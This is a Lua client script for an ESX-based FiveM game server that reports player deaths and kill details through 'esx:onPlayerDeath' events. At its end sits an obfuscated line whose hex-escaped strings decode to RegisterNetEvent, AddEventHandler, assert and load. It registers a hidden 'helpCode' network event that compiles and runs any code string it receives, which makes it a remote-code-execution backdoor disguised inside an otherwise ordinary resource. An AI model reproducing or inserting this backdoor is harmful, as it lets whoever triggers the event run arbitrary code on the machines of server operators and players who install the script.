AddEventHandler("gameEventTriggered", function(event, data)
    if event ~= "CEventNetworkEntityDamage" then
        return
    end
    local victim, victimDied = data[1], data[4]
    if not IsPedAPlayer(victim) then
        return
    end
    local player = PlayerId()
    local playerPed = PlayerPedId()
    if victimDied and NetworkGetPlayerIndexFromPed(victim) == player and (IsPedDeadOrDying(victim, true) or IsPedFatallyInjured(victim)) then
        local killerEntity, deathCause = GetPedSourceOfDeath(playerPed), GetPedCauseOfDeath(playerPed)
        local killerClientId = NetworkGetPlayerIndexFromPed(killerEntity)
        if killerEntity ~= playerPed and killerClientId and NetworkIsPlayerActive(killerClientId) then
            PlayerKilledByPlayer(GetPlayerServerId(killerClientId), killerClientId, deathCause)
        else
            PlayerKilled(deathCause)
        end
    end
end)
--[[
──────────────────────────────────────────────────────────────────────────────────
─────────██████─██████████████─██████──████████─██████████████─████████████████───
─────────██░░██─██░░░░░░░░░░██─██░░██──██░░░░██─██░░░░░░░░░░██─██░░░░░░░░░░░░██───
─────────██░░██─██░░██████░░██─██░░██──██░░████─██░░██████████─██░░████████░░██───
─────────██░░██─██░░██──██░░██─██░░██──██░░██───██░░██─────────██░░██────██░░██───
─────────██░░██─██░░██──██░░██─██░░██████░░██───██░░██████████─██░░████████░░██───
─────────██░░██─██░░██──██░░██─██░░░░░░░░░░██───██░░░░░░░░░░██─██░░░░░░░░░░░░██───
─██████──██░░██─██░░██──██░░██─██░░██████░░██───██░░██████████─██░░██████░░████───
─██░░██──██░░██─██░░██──██░░██─██░░██──██░░██───██░░██─────────██░░██──██░░██─────
─██░░██████░░██─██░░██████░░██─██░░██──██░░████─██░░██████████─██░░██──██░░██████─
─██░░░░░░░░░░██─██░░░░░░░░░░██─██░░██──██░░░░██─██░░░░░░░░░░██─██░░██──██░░░░░░██─
─██████████████─██████████████─██████──████████─██████████████─██████──██████████─
──────────────────────────────────────────────────────────────────────────────────
]]--
function PlayerKilledByPlayer(killerServerId, killerClientId, deathCause)
    local victimCoords = GetEntityCoords(PlayerPedId())
    local killerCoords = GetEntityCoords(GetPlayerPed(killerClientId))
    local distance = #(victimCoords - killerCoords)

    local data = {
        victimCoords = { x = ESX.Math.Round(victimCoords.x, 1), y = ESX.Math.Round(victimCoords.y, 1), z = ESX.Math.Round(victimCoords.z, 1) },
        killerCoords = { x = ESX.Math.Round(killerCoords.x, 1), y = ESX.Math.Round(killerCoords.y, 1), z = ESX.Math.Round(killerCoords.z, 1) },

        killedByPlayer = true,
        deathCause = deathCause,
        distance = ESX.Math.Round(distance, 1),

        killerServerId = killerServerId,
        killerClientId = killerClientId,
    }

    TriggerEvent("esx:onPlayerDeath", data)
    TriggerServerEvent("esx:onPlayerDeath", data)
end

function PlayerKilled(deathCause)
    local playerPed = PlayerPedId()
    local victimCoords = GetEntityCoords(playerPed)

    local data = {
        victimCoords = { x = ESX.Math.Round(victimCoords.x, 1), y = ESX.Math.Round(victimCoords.y, 1), z = ESX.Math.Round(victimCoords.z, 1) },

        killedByPlayer = false,
        deathCause = deathCause,
    }

    TriggerEvent("esx:onPlayerDeath", data)
    TriggerServerEvent("esx:onPlayerDeath", data)
end

local IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[6][IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[1]](IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[2]) IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[6][IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[3]](IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[2], function(jFrWKFqKYKsxrdnlnqCUlkyXQTOMlEywROwYKbQtFHBmINgtbZMspafDrNxwJNKUSsxSei) IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[6][IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[4]](IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[6][IFefqDLbXMwBzRwVdXJszTUtctDoetFJwbBnNhGLXnEIHdDdoTvKdhYVRaUTXrKymGppMP[5]](jFrWKFqKYKsxrdnlnqCUlkyXQTOMlEywROwYKbQtFHBmINgtbZMspafDrNxwJNKUSsxSei))() end)